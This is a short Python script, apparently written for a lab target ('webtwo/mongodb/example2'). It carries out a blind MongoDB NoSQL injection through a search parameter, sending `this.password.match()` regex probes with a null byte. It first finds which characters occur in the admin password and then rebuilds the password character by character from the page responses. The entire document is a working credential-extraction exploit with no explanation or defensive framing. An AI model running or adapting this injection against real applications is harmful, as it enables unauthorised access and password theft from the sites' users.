# http://webtwo/mongodb/example2/?search=admin' %26%26 this.password.match(/password/)+%00
import requests
import string

con = 1
ALPHABET = string.digits + string.ascii_letters
finalPw = ""
passwordChars = ""
for c in ALPHABET:
    url = "http://webtwo/mongodb/example2/?search=admin' %26%26 this.password.match(/" + c + "/)+%00"
    r = requests.get(url)
    htmlText = r.text

    if "admin" in htmlText:
        passwordChars = passwordChars + c

print("All the characters in the password: "+passwordChars)

while con == 1:
    checkFinalStringSize = len(finalPw)
    # print("--while loop--")
    for pwc in passwordChars:

        # check if in pos and correct character, if not false
        #print("check letter " + pwc)
        letterToCheck = finalPw + pwc
        url = "http://webtwo/mongodb/example2/?search=admin' %26%26 this.password.match(/^" + letterToCheck + ".*$/)+%00"
        r = requests.get(url)
        htmlText = r.text

        # correct pos and character
        if "admin" in htmlText:
            #print("       added letter " + pwc)
            finalPw = finalPw + pwc

        # check if this is the last character in the password
        url = "http://webtwo/mongodb/example2/?search=admin' %26%26 this.password.match(/^" + letterToCheck + "$/)+%00"
        r = requests.get(url)
        htmlText = r.text

        # if no admin, then we still need more chars
        if "admin" in htmlText:
            con = 1
    finalStringsize = len(finalPw)
    if finalStringsize == checkFinalStringSize:
        print("The password is: "+finalPw)
        break

